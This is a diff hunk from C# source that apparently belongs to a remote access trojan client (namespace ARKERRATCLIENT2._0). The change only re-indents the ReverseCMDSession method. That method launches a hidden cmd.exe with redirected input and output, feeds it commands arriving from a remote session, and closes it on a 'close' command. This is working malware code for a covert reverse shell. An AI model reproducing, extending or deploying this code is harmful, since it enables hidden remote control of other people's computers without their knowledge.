@@ -101,39 +101,41 @@ namespace ARKERRATCLIENT2._0
 
         public static void ReverseCMDSession(string data)
         {
-            if (!hasStarted)
-            {
-                processStartInfo.FileName = "cmd.exe";
-                processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
-                processStartInfo.UseShellExecute = false;
-                processStartInfo.RedirectStandardInput = true;
-                processStartInfo.RedirectStandardOutput = true;
-                processStartInfo.RedirectStandardError = true;
-                processStartInfo.CreateNoWindow = true;
+            
+                if (!hasStarted)
+                {
+                    processStartInfo.FileName = "cmd.exe";
+                    processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
+                    processStartInfo.UseShellExecute = false;
+                    processStartInfo.RedirectStandardInput = true;
+                    processStartInfo.RedirectStandardOutput = true;
+                    processStartInfo.RedirectStandardError = true;
+                    processStartInfo.CreateNoWindow = true;
 
-                cmd = new Process();
-                cmd.StartInfo = processStartInfo;
-                cmd.OutputDataReceived += Cmd_OutputDataReceived;
-                cmd.ErrorDataReceived += Cmd_ErrorDataReceived;
-                cmd.EnableRaisingEvents = true;
-                cmd.Exited += Cmd_Exited;
+                    cmd = new Process();
+                    cmd.StartInfo = processStartInfo;
+                    cmd.OutputDataReceived += Cmd_OutputDataReceived;
+                    cmd.ErrorDataReceived += Cmd_ErrorDataReceived;
+                    cmd.EnableRaisingEvents = true;
+                    cmd.Exited += Cmd_Exited;
 
-                cmd.Start();
-                cmd.BeginOutputReadLine();
-                cmd.BeginErrorReadLine();
+                    cmd.Start();
+                    cmd.BeginOutputReadLine();
+                    cmd.BeginErrorReadLine();
 
-                hasStarted = true;
-            }
+                    hasStarted = true;
+                }
 
-            if (data.Contains("close") || RATClientSession.noConnection)
-            {
-                hasStarted = false;
-                cmd.Close();
-            }
-            else
-            {
-                cmd.StandardInput.WriteLine(data);
-            }
+                if (data.Contains("close") || RATClientSession.noConnection)
+                {
+                    hasStarted = false;
+                    cmd.Close();
+                }
+                else
+                {
+                    cmd.StandardInput.WriteLine(data);
+                }
+            
         }
 
         private static async void Cmd_OutputDataReceived(object sender, DataReceivedEventArgs e)
